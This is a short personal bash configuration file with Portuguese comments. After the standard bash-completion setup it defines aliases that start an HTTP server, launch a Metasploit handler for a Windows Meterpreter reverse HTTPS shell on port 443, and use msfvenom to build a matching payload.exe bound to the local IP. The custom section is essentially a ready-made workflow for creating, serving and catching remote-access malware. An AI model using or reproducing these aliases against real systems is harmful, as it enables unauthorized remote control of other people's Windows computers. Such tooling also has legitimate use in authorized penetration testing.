# ~/.bashrc completo e personalizado

# Configurações padrão do bashrc
# Se não estiver em modo POSIX, carregue bash-completion (auto-completar)
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

# Outras funções padrão do sistema podem estar aqui (não apagar esta parte)

# ================================
# Customizações pessoais
# ================================

# Alias para iniciar o servidor HTTP local
alias servidor='bash ~/start_http_server.sh'

# Alias dinâmico para iniciar o listener do Metasploit detectando IP automaticamente
alias listener='IP=$(hostname -I | awk "{print $1}"); msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST $IP; set LPORT 443; exploit"'

# Alias para gerar payload automaticamente (IP dinâmico + porta 443)
alias payload='IP=$(hostname -I | awk "{print $1}"); msfvenom -p windows/meterpreter/reverse_https LHOST=$IP LPORT=443 -f exe -o ~/payload.exe && echo "Payload gerado em ~/payload.exe com IP $IP e porta 443"'
